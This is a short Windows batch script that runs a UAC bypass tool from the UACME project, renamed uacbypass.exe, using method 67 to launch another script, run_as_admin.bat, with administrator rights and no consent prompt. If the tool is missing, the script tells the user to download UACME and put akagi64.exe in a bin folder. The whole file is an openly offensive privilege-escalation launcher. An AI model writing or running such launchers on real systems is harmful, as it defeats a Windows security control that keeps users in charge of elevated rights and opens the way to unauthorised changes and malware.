@echo off
cd /d "%~dp0"

if exist bin\uacbypass.exe (
    echo Running UAC bypass (method 67)...
    bin\uacbypass.exe 67 "%~dp0run_as_admin.bat"
) else (
    echo uacbypass.exe not found in bin folder.
    echo Please download UACME and place akagi64.exe as uacbypass.exe in bin\
    pause
    exit /b 1
)

pause